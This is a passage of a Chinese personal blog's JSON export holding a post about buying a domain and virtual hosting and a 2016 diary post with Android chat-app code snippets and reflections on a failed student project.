title=\"域名和虚拟主机\"></a>域名和虚拟主机</h3><p><strong>更新时间：2016年11月24日</strong><br><strong>一直想要一个自己的域名和自己的虚拟主机，在昨天突发奇想去了godadday逛了一下看有没有合适的域名，很庆幸我捡到了一个一年8块钱的域名，不知道为什么那么便宜，总之就是8块钱买了一个属于自己的域名：</strong></p>\n<ol>\n<li>.在godadday上注册一个账号，然后筛选一个你觉得合适的域名下订单。</li>\n<li>进入自己的控制台了解一下基本情况.</li>\n<li>域名可以绑定自己配置的服务器，也可以在网上购买一个虚拟主机，通过配置域名的DNS、host names和Nameservers将域名绑定到指定的主机</li>\n<li>下载一个ftp软件，通过ftp软件来管理自己的虚拟主机，推荐软件FileZilla</li>\n</ol>\n<p><strong>推荐虚拟主机购买网址hostinger(英国)，可获得免费的虚拟主机一年</strong><br><a href=\"https://www.godaddy.com\">godadday</a>购买域名，个人感觉比<a href=\"http://wanwang.aliyun.com\">万网</a>要划算<br><a href=\"http://www.hostinger.com.hk\">hostinger</a>购买虚拟主机，有免费的空间哦</p>"},{"title":"许久没有更新的流水账","date":"2016-11-20T07:18:23.000Z","_content":"\n**好久没有更新博客了，有很多原因。一方面，前段时间事情太多，大概花了一个月来写一个android聊天软件来参加，学校的比赛，虽然写好了，也还像个样子，但在最后答辩的时候选择了放弃。因为国创答辩失败了，恰好那个比赛的答辩和国创答辩同时进行的，所有带着沮丧的心情离开了。另一方面，换了一台电脑工作，而我的博客后台在原来的电脑上，我一直想将它迁移到新的电脑上，然而一直没有成功。因此，大概有托更了3个月的博客，现在静下心来总结一下最近的学习。**\n\n<!--more-->\n\n# Android项目经验\n**1.Toolbar上实现返回按钮**\n``` java\nbackButton.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                onBackPressed();    //实现返回功能\n            }\n        });\n```\n``` java\npublic void onBackPressed() {\n        // TODO Auto-generated method stub\n        super.onBackPressed();\n    }\n```\n\n**2.listview自定义Adapter**\n``` java\npublic class Chatting_Adapter extends BaseAdapter {\n    private static final int PAGE_MESSAGE_COUNT = 30;\n    public  static String USERNAME = \"com.example.username\";\n    public  static String MYNAME = \"com.example.myname\";\n    private List<cn.jpush.im.android.api.model.Message> chatting_list;\n    private LayoutInflater myInflater;\n    private Context mContext;\n    private int mStart;\n    private int mOffset = PAGE_MESSAGE_COUNT;\n    private Conversation mConversation;\n\n    public Chatting_Adapter(Context context, String UserName, List<Message> chatting_list) {\n        this.USERNAME = UserName;\n        this.mContext = context;\n        this.mStart = mOffset;\n        this.chatting_list = chatting_list;\n        myInflater = LayoutInflater.from(context);\n    }\n\n    //返回数据集长度\n    @Override\n    public int getCount() {\n        return chatting_list.size();\n    }\n\n    @Override\n    public Object getItem(int position) {\n        return chatting_list.get(position);\n    }\n\n    @Override\n    public long getItemId(int position) {\n        return position;\n    }\n\n    public void setData(List<Message> chatting_list)\n    {\n        // TODO Auto-generated method stub\n        this.chatting_list = chatting_list;\n    }\n\n    @Override\n    public View getView(final int position, View view, ViewGroup viewGroup) {\n        Message message = chatting_list.get(position);\n        ViewHolder holder;\n\n        if(view == null) {\n            view = myInflater.inflate(R.layout.chat_text_ui, viewGroup, false);\n            holder = new ViewHolder();\n            holder.left_layout = (RelativeLayout)view.findViewById(R.id.left_layout);\n            holder.friend_username = (TextView)view.findViewById(R.id.left_tv_name);\n            holder.friend_head = (ImageView)view.findViewById(R.id.left_iv_portrait);\n            holder.left_chatting_message = (TextView)view.findViewById(R.id.left_tv_content);\n            holder.left_chatting_time = (TextView)view.findViewById(R.id.left_tv_time);\n            holder.right_layout = (RelativeLayout)view.findViewById(R.id.right_layout);\n            holder.myname = (TextView)view.findViewById(R.id.right_tv_name);\n            holder.my_head = (ImageView)view.findViewById(R.id.right_iv_portrait);\n            holder.right_chatting_message = (TextView)view.findViewById(R.id.right_tv_content);\n            holder.right_chatting_time = (TextView)view.findViewById(R.id.right_tv_time);\n\n            view.setTag(holder);\n        }\n        else {\n            holder = (ViewHolder)view.getTag();\n        }\n\n        if (message.getFromUser().getUserName() == JMessageClient.getMyInfo().getUserName()) {\n            holder.right_layout.setVisibility(View.VISIBLE);\n            holder.left_layout.setVisibility(View.GONE);\n            holder.myname.setText(message.getFromUser().getUserName());\n            //holder.friend_head.setImageResource(R.mipmap.friend_head);\n            TimeFormat timeFormat = new TimeFormat(mContext, message.getCreateTime());\n            holder.right_chatting_time.setText(timeFormat.getTime());\n            TextContent textContent = (TextContent) message.getContent();\n            holder.right_chatting_message.setText(textContent.getText());\n        }\n        else {\n            holder.left_layout.setVisibility(View.VISIBLE);\n            holder.right_layout.setVisibility(View.GONE);\n            holder.friend_username.setText(message.getFromUser().getUserName());\n            //holder.friend_head.setImageResource(R.mipmap.friend_head);\n            TimeFormat timeFormat = new TimeFormat(mContext,message.getCreateTime());\n            holder.left_chatting_time.setText(timeFormat.getTime());\n            TextContent textContent = (TextContent) message.getContent();\n            holder.left_chatting_message.setText(textContent.getText());\n        }\n        return view;\n    }\n\n    private void incrementStartPosition() {\n        ++mStart;\n    }\n\n    public void clearMsgList() {\n        chatting_list.clear();\n        mStart = 0;\n        notifyDataSetChanged();\n    }\n\n    public Message getLastMsg() {\n        if (chatting_list.size() > 0) {\n            return chatting_list.get(chatting_list.size() - 1);\n        } else {\n            return null;\n        }\n    }\n\n    public void addMsgToList() {\n        chatting_list.clear();\n        mConversation = JMessageClient.getSingleConversation(USERNAME);\n        chatting_list = mConversation.getMessagesFromNewest(0,mOffset);\n        Collections.reverse(chatting_list);\n        //chatting_list.add(msg);\n        //incrementStartPosition();\n        notifyDataSetChanged();\n    }\n\n    private class ViewHolder {\n        RelativeLayout left_layout;\n        TextView friend_username;\n        TextView left_chatting_message;\n        TextView left_chatting_time;\n        ImageView friend_head;\n        RelativeLayout right_layout;\n        TextView myname;\n        TextView right_chatting_message;\n        TextView right_chatting_time;\n        ImageView my_head;\n    }\n}\n```\n**使用自定义Adapter**\n``` java\nfriendListAdapter = new FriendListAdapter(Friend_List.this, friendlist);\n                        Friend_List.setAdapter(friendListAdapter);\n```\n\n**3.退出确认Dialog**\n``` java\npublic void exitActivity(){\n        new AlertDialog.Builder(this).setTitle(\"确认退出吗？\")\n                .setIcon(android.R.drawable.ic_dialog_info)\n                .setPositiveButton(\"确定\", new DialogInterface.OnClickListener() {\n\n                    @Override\n                    public void onClick(DialogInterface dialog, int which) {\n                        // 点击“确认”后的操作\n                        JMessageClient.logout();\n                        Friend_List.this.finish();\n\n                    }\n                })\n                .setNegativeButton(\"返回\", new DialogInterface.OnClickListener() {\n\n                    @Override\n                    public void onClick(DialogInterface dialog, int which) {\n                        // 点击“返回”后的操作,这里不设置没有任何操作\n                    }\n                }).show();\n    }\n```\n**4.不结束软件退出**\n``` java\n@Override\n    public boolean onKeyDown(int keyCode, KeyEvent event) {\n\n        if (keyCode == KeyEvent.KEYCODE_BACK) {\n            Intent home = new Intent(Intent.ACTION_MAIN);\n            home.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);\n            home.addCategory(Intent.CATEGORY_HOME);\n            startActivity(home);\n            return true;\n        }\n        return super.onKeyDown(keyCode, event);\n    }\n```\n**5.为软件插入启动广告**\n``` java\npublic class LaunchActivity extends AppCompatActivity {\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        //加载启动界面\n        setContentView(R.layout.activity_launch);\n                //当计时结束时，调至主界面\n        Handler handler = new Handler();\n        handler.postDelayed(new Runnable() {\n            @Override\n            public void run() {\n                startActivity(new Intent(LaunchActivity.this, MainActivity.class));\n                LaunchActivity.this.finish();\n            }\n        }, 3000);   //界面停留时间\n    }\n}\n```\n**更多内容在github上**\n\n# 目前学习进度\n**现在已经将之前的电脑作为了服务器，目前正在熟悉网站开发一整套流程。目标是熟悉使用php大法，css和javascript,数据库这个东西讲道理我不想接触，但是没办法，这一关必须得过。虽然有xml，但是xml并不是合理的选择,所以继续学呗。**\n**最近在一些新闻上看到android可能有新的发展方向，可能会逐渐走向闭源。怎么说呢，即使google是这样想的，但是这肯定是一个比较漫长的过程，不管怎么说，google不会放弃中国这个市场的，因此也不会拒绝中国的开发人员，因此，学习Android仍然是可行的，最近从图书馆借了一本书，准备系统性的学习一下Android，结束以前的野路子。**\n\n# 对于国创失败的感悟\n**很不幸，我的第一次国创之路失败了，对此做个总结。**\n**首先，在找队友的路上，我就走得很不顺。找不到可靠的队友，最后无奈自己来做队长，基本上所有的事情都由我一手独揽。原本准备让一个队友写计划书，然而到了要交计划书的时候他告诉我他没有电脑，写不出来，所以退出。在最后一两天临时找了一个学弟凑人数，然后自己一个人忙着所有的事情。其次，在方向上出现问题。之前一直找不到方向，然后找了一个高中同学聊了半天，决定了一个方向，然而由于我迫切地想要接入小米的接口，使得我计划的整个项目没有创新点，这也成了国创失败的主要原因。归咎下来，主要还是因为我太一意孤行了，之前迫切想要接入小米接口，队友也不好阻止我，就放任我走向一个死胡同。**\n**不知道是什么原因，一直没有找到可以一起学习、一起做项目的同伴，在一个人瞎摸索的路上举步维艰，时不时地出现迷茫的情况，不知道自己想要学什么，不知道自己想要做出个什么项目。总是在一个人的路上走走停停。所以，现在真的想寻求一个可靠的同伴一起学习、一起做项目。**\n\n### 新的信仰\n**国创答辩刚刚结束，学院就来了一个讲座，dota女神前来宣讲。讲道理，女神真的很优秀，特别喜欢她信仰的那句话**\n\n**：所有事情到最后都将是好的结局，如果不好，那么就不是结局.\n：Everything gonna be fine in the end,if it's not fine,it's not the end.**","source":"_posts/流水账.md","raw":"---\ntitle: 许久没有更新的流水账\ntags: Android\ndate: 2016-11-20 15:18:23\ncategories: Android\n---\n\n**好久没有更新博客了，有很多原因。一方面，前段时间事情太多，大概花了一个月来写一个android聊天软件来参加，学校的比赛，虽然写好了，也还像个样子，但在最后答辩的时候选择了放弃。因为国创答辩失败了，恰好那个比赛的答辩和国创答辩同时进行的，所有带着沮丧的心情离开了。另一方面，换了一台电脑工作，而我的博客后台在原来的电脑上，我一直想将它迁移到新的电脑上，然而一直没有成功。因此，大概有托更了3个月的博客，现在静下心来总结一下最近的学习。**\n\n<!--more-->\n\n# Android项目经验\n**1.Toolbar上实现返回按钮**\n``` java\nbackButton.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                onBackPressed();    //实现返回功能\n            }\n        });\n```\n``` java\npublic void onBackPressed() {\n        // TODO Auto-generated method stub\n        super.onBackPressed();\n    }\n```\n\n**2.listview自定义Adapter**\n``` java\npublic class Chatting_Adapter extends BaseAdapter {\n    private static final int PAGE_MESSAGE_COUNT = 30;\n    public  static String USERNAME = \"com.example.username\";\n    public  static String MYNAME = \"com.example.myname\";\n    private List<cn.jpush.im.android.api.model.Message> chatting_list;\n    private LayoutInflater myInflater;\n    private Context mContext;\n    private int mStart;\n    private int mOffset = PAGE_MESSAGE_COUNT;\n    private Conversation mConversation;\n\n    public Chatting_Adapter(Context context, String UserName, List<Message> chatting_list) {\n        this.USERNAME = UserName;\n        this.mContext = context;\n        this.mStart = mOffset;\n        this.chatting_list = chatting_list;\n        myInflater = LayoutInflater.from(context);\n    }\n\n    //返回数据集长度\n    @Override\n    public int getCount() {\n        return chatting_list.size();\n    }\n\n    @Override\n    public Object getItem(int position) {\n        return chatting_list.get(position);\n    }\n\n    @Override\n    public long getItemId(int position) {\n        return position;\n    }\n\n    public void setData(List<Message> chatting_list)\n    {\n        // TODO Auto-generated method stub\n        this.chatting_list = chatting_list;\n    }\n\n    @Override\n    public View getView(final int position, View view, ViewGroup viewGroup) {\n        Message message = chatting_list.get(position);\n        ViewHolder holder;\n\n        if(view == null) {\n            view = myInflater.inflate(R.layout.chat_text_ui, viewGroup, false);\n            holder = new ViewHolder();\n            holder.left_layout = (RelativeLayout)view.findViewById(R.id.left_layout);\n            holder.friend_username = (TextView)view.findViewById(R.id.left_tv_name);\n            holder.friend_head = (ImageView)view.findViewById(R.id.left_iv_portrait);\n            holder.left_chatting_message = (TextView)view.findViewById(R.id.left_tv_content);\n            holder.left_chatting_time = (TextView)view.findViewById(R.id.left_tv_time);\n            holder.right_layout = (RelativeLayout)view.findViewById(R.id.right_layout);\n            holder.myname = (TextView)view.findViewById(R.id.right_tv_name);\n            holder.my_head = (ImageView)view.findViewById(R.id.right_iv_portrait);\n            holder.right_chatting_message = (TextView)view.findViewById(R.id.right_tv_content);\n            holder.right_chatting_time = (TextView)view.findViewById(R.id.right_tv_time);\n\n            view.setTag(holder);\n        }\n        else {\n            holder = (ViewHolder)view.getTag();\n        }\n\n        if (message.getFromUser().getUserName() == JMessageClient.getMyInfo().getUserName()) {\n            holder.right_layout.setVisibility(View.VISIBLE);\n            holder.left_layout.setVisibility(View.GONE);\n            holder.myname.setText(message.getFromUser().getUserName());\n            //holder.friend_head.setImageResource(R.mipmap.friend_head);\n            TimeFormat timeFormat = new TimeFormat(mContext, message.getCreateTime());\n            holder.right_chatting_time.setText(timeFormat.getTime());\n            TextContent textContent = (TextContent) message.getContent();\n            holder.right_chatting_message.setText(textContent.getText());\n        }\n        else {\n            holder.left_layout.setVisibility(View.VISIBLE);\n            holder.right_layout.setVisibility(View.GONE);\n            holder.friend_username.setText(message.getFromUser().getUserName());\n            //holder.friend_head.setImageResource(R.mipmap.friend_head);\n            TimeFormat timeFormat = new TimeFormat(mContext,message.getCreateTime());\n            holder.left_chatting_time.setText(timeFormat.getTime());\n            TextContent textContent = (TextContent) message.getContent();\n            holder.left_chatting_message.setText(textContent.getText());\n        }\n        return view;\n    }\n\n    private void incrementStartPosition() {\n        ++mStart;\n    }\n\n    public void clearMsgList() {\n        chatting_list.clear();\n        mStart = 0;\n        notifyDataSetChanged();\n    }\n\n    public Message getLastMsg() {\n        if (chatting_list.size() > 0) {\n            return chatting_list.get(chatting_list.size() - 1);\n        } else {\n            return null;\n        }\n    }\n\n    public void addMsgToList() {\n        chatting_list.clear();\n        mConversation = JMessageClient.getSingleConversation(USERNAME);\n        chatting_list = mConversation.getMessagesFromNewest(0,mOffset);\n        Collections.reverse(chatting_list);\n        //chatting_list.add(msg);\n        //incrementStartPosition();\n        notifyDataSetChanged();\n    }\n\n    private class ViewHolder {\n        RelativeLayout left_layout;\n        TextView friend_username;\n        TextView left_chatting_message;\n        TextView left_chatting_time;\n        ImageView friend_head;\n        RelativeLayout right_layout;\n        TextView myname;\n        TextView right_chatting_message;\n        TextView right_chatting_time;\n        ImageView my_head;\n    }\n}\n```\n**使用自定义Adapter**\n``` java\nfriendListAdapter = new FriendListAdapter(Friend_List.this, friendlist);\n                        Friend_List.setAdapter(friendListAdapter);\n```\n\n**3.退出确认Dialog**\n``` java\npublic void exitActivity(){\n        new AlertDialog.Builder(this).setTitle(\"确认退出吗？\")\n                .setIcon(android.R.drawable.ic_dialog_info)\n                .setPositiveButton(\"确定\", new DialogInterface.OnClickListener() {\n\n                    @Override\n                    public void onClick(DialogInterface dialog, int which) {\n                        // 点击“确认”后的操作\n                        JMessageClient.logout();\n                        Friend_List.this.finish();\n\n                    }\n                })\n                .setNegativeButton(\"返回\", new DialogInterface.OnClickListener() {\n\n                    @Override\n                    public void onClick(DialogInterface dialog, int which) {\n                        // 点击“返回”后的操作,这里不设置没有任何操作\n                    }\n                }).show();\n    }\n```\n**4.不结束软件退出**\n``` java\n@Override\n    public boolean onKeyDown(int keyCode, KeyEvent event) {\n\n        if (keyCode == KeyEvent.KEYCODE_BACK) {\n            Intent home = new Intent(Intent.ACTION_MAIN);\n            home.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);\n            home.addCategory(Intent.CATEGORY_HOME);\n            startActivity(home);\n            return true;\n        }\n        return super.onKeyDown(keyCode, event);\n    }\n```\n**5.为软件插入启动广告**\n``` java\npublic class LaunchActivity extends AppCompatActivity {\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        //加载启动界面\n        setContentView(R.layout.activity_launch);\n                //当计时结束时，调至主界面\n        Handler handler = new Handler();\n        handler.postDelayed(new Runnable() {\n            @Override\n            public void run() {\n                startActivity(new Intent(LaunchActivity.this, MainActivity.class));\n                LaunchActivity.this.finish();\n            }\n        }, 3000);   //界面停留时间\n    }\n}\n```\n**更多内容在github上**\n\n# 目前学习进度\n**现在已经将之前的电脑作为了服务器，目前正在熟悉网站开发一整套流程。目标是熟悉使用php大法，css和javascript,数据库这个东西讲道理我不想接触，但是没办法，这一关必须得过。虽然有xml，但是xml并不是合理的选择,所以继续学呗。**\n**最近在一些新闻上看到android可能有新的发展方向，可能会逐渐走向闭源。怎么说呢，即使google是这样想的，但是这肯定是一个比较漫长的过程，不管怎么说，google不会放弃中国这个市场的，因此也不会拒绝中国的开发人员，因此，学习Android仍然是可行的，最近从图书馆借了一本书，准备系统性的学习一下Android，结束以前的野路子。**\n\n# 对于国创失败的感悟\n**很不幸，我的第一次国创之路失败了，对此做个总结。**\n**首先，在找队友的路上，我就走得很不顺。找不到可靠的队友，最后无奈自己来做队长，基本上所有的事情都由我一手独揽。原本准备让一个队友写计划书，然而到了要交计划书的时候他告诉我他没有电脑，写不出来，所以退出。在最后一两天临时找了一个学弟凑人数，然后自己一个人忙着所有的事情。其次，在方向上出现问题。之前一直找不到方向，然后找了一个高中同学聊了半天，决定了一个方向，然而由于我迫切地想要接入小米的接口，使得我计划的整个项目没有创新点，这也成了国创失败的主要原因。归咎下来，主要还是因为我太一意孤行了，之前迫切想要接入小米接口，队友也不好阻止我，就放任我走向一个死胡同。**\n**不知道是什么原因，一直没有找到可以一起学习、一起做项目的同伴，在一个人瞎摸索的路上举步维艰，时不时地出现迷茫的情况，不知道自己想要学什么，不知道自己想要做出个什么项目。总是在一个人的路上走走停停。所以，现在真的想寻求一个可靠的同伴一起学习、一起做项目。**\n\n### 新的信仰\n**国创答辩刚刚结束，学院就来了一个讲座，dota女神前来宣讲。讲道理，女神真的很优秀，特别喜欢她信仰的那句话**\n\n**：所有事情到最后都将是好的结局，如果不好，那么就不是结局.\n：Everything gonna be fine in the end,if it's not fine,it's not the end.**","slug":"流水账","published":1,"updated":"2017-11-28T02:53:25.403Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsd0m003xyp0lgilq4r1r","content":"<p><strong>好久没有更新博客了，有很多原因。一方面，前段时间事情太多，大概花了一个月来写一个android聊天软件来参加，学校的比赛，虽然写好了，也还像个样子，但在最后答辩的时候选择了放弃。因为国创答辩失败了，恰好那个比赛的答辩和国创答辩同时进行的，所有带着沮丧的心情离开了。另一方面，换了一台电脑工作，而我的博客后台在原来的电脑上，我一直想将它迁移到新的电脑上，然而一直没有成功。因此，大概有托更了3个月的博客，现在静下心来总结一下最近的学习。</strong></p>\n<a id=\"more\"></a>\n<h1 id=\"Android项目经验\"><a href=\"#Android项目经验\" class=\"headerlink\" title=\"Android项目经验\"></a>Android项目经验</h1><p><strong>1.Toolbar上实现返回按钮</strong><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">backButton.setOnClickListener(<span class=\"keyword\">new</span> View.OnClickListener() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onClick</span><span class=\"params\">(View v)</span> </span>&#123;</span><br><span class=\"line\">                onBackPressed();    <span class=\"comment\">//实现返回功能</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onBackPressed</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// TODO Auto-generated method stub</span></span><br><span class=\"line\">        <span class=\"keyword\">super</span>.onBackPressed();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p><strong>2.listview自定义Adapter</strong><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Chatting_Adapter</span> <span class=\"keyword\">extends</span> <span class=\"title\">BaseAdapter</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> PAGE_MESSAGE_COUNT = <span class=\"number\">30</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span>  <span class=\"keyword\">static</span> String USERNAME = <span class=\"string\">\"com.example.username\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span>  <span class=\"keyword\">static</span> String MYNAME = <span class=\"string\">\"com.example.myname\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> List&lt;cn.jpush.im.android.api.model.Message&gt; chatting_list;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> LayoutInflater myInflater;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Context mContext;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> mStart;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> mOffset = PAGE_MESSAGE_COUNT;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Conversation mConversation;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Chatting_Adapter</span><span class=\"params\">(Context context, String UserName, List&lt;Message&gt; chatting_list)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.USERNAME = UserName;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.mContext = context;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.mStart = mOffset;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.chatting_list = chatting_list;</span><br><span class=\"line\">        myInflater = LayoutInflater.from(context);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//返回数据集长度</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">getCount</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> chatting_list.size();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">getItem</span><span class=\"params\">(<span class=\"keyword\">int</span> position)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> chatting_list.get(position);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">long</span> <span class=\"title\">getItemId</span><span class=\"params\">(<span class=\"keyword\">int</span> position)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> position;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setData</span><span class=\"params\">(List&lt;Message&gt; chatting_list)</span></span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// TODO Auto-generated method stub</span></span><br><span class=\"line\">        <span class=\"keyword\">this</span>.chatting_list = chatting_list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> View <span class=\"title\">getView</span><span class=\"params\">(<span class=\"keyword\">final</span> <span class=\"keyword\">int</span> position, View view, ViewGroup viewGroup)</span> </span>&#123;</span><br><span class=\"line\">        Message message = chatting_list.get(position);</span><br><span class=\"line\">        ViewHolder holder;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(view == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            view = myInflater.inflate(R.layout.chat_text_ui, viewGroup, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">            holder = <span class=\"keyword\">new</span> ViewHolder();</span><br><span class=\"line\">            holder.left_layout = (RelativeLayout)view.findViewById(R.id.left_layout);</span><br><span class=\"line\">            holder.friend_username = (TextView)view.findViewById(R.id.left_tv_name);</span><br><span class=\"line\">            holder.friend_head = (ImageView)view.findViewById(R.id.left_iv_portrait);</span><br><span class=\"line\">            holder.left_chatting_message = (TextView)view.findViewById(R.id.left_tv_content);</span><br><span class=\"line\">            holder.left_chatting_time = (TextView)view.findViewById(R.id.left_tv_time);</span><br><span class=\"line\">            holder.right_layout = (RelativeLayout)view.findViewById(R.id.right_layout);</span><br><span class=\"line\">            holder.myname = (TextView)view.findViewById(R.id.right_tv_name);</span><br><span class=\"line\">            holder.my_head = (ImageView)view.findViewById(R.id.right_iv_portrait);</span><br><span class=\"line\">            holder.right_chatting_message = (TextView)view.findViewById(R.id.right_tv_content);</span><br><span class=\"line\">            holder.right_chatting_time = (TextView)view.findViewById(R.id.right_tv_time);</span><br><span class=\"line\"></span><br><span class=\"line\">            view.setTag(holder);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            holder = (ViewHolder)view.getTag();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (message.getFromUser().getUserName() == 